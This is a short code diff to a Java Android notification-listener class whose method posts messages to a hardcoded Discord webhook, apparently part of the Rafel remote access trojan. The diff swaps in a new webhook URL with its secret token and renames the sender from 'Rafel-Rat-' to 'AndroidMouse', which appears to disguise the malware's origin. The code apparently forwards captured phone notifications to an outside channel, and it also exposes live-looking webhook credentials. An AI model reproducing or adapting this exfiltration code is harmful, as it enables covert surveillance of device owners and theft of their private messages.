@@ -59,10 +59,10 @@ public class NotificationListener extends NotificationListenerService {
     }
 
     public static void senddisp(String msg) throws IOException {
-        DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/921133285835423815/q9AEBnc-O2EYsrpOSpXfYzp1nF0xMKfu_CnwDLPjBiB_pDvOoZP-dfG2vhFCW27Xqti9");
+        DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1026189010428764260/pT2kcrPy9xeWsOSGfC8viRtqQ38Y4bqbk6gYYQHjCR8vGorwqzZGxfij0yGFJi0mOEsU");
         webhook.setContent(msg);
         webhook.setAvatarUrl("https://avatars.githubusercontent.com/u/46685308?v=4");
-        webhook.setUsername("Rafel-Rat-");
+        webhook.setUsername("AndroidMouse");
         webhook.execute();
     }
 }
